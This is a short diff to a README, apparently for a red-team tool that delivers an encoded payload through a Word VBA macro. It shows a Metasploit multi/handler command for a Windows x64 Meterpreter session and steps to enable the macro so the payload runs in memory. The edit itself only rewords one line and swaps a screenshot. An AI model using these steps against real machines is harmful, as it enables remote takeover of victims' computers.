@@ -27,9 +27,9 @@ sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterp
 ### 5. Execute the VBA Macro
 - Open the Word document containing the macro
 - Enable macros when prompted
-- The encrypted payload is decoded and executed in memory
+- The encoded payload is decoded and executed in memory
 
-![Captura de pantalla 2025-03-10 a la(s) 15 33 29](https://github.com/user-attachments/assets/7d719c6c-9e80-4f9e-8669-437b5c495510)
+![Captura de pantalla 2025-03-11 a la(s) 16 27 16](https://github.com/user-attachments/assets/368db687-88f2-47ce-ba49-eb61860841b0)
 
 
 ### 6. Compatibility Note
